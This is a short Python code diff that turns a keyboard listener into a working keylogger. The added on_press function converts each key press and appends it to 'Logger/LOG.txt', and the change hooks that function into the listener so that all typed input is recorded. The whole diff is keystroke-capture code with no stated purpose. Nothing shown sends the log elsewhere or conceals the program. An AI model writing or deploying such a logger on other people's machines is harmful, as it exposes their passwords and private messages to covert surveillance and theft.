@@ -5,8 +5,14 @@ def convert_key(key) -> str:
     return str(key).replace("'", '').split('.')[-1]
 
 
+def on_press(key) -> None:
+    key = convert_key(key)
+    with open('Logger/LOG.txt', 'a') as file:
+        file.write('\n' if key == 'space' else key)
+
+
 def keyboard_listener() -> None:
-    with Listener(on_press=None, on_release=None) as keyboard:
+    with Listener(on_press=on_press, on_release=None) as keyboard:
         keyboard.join()
 
 
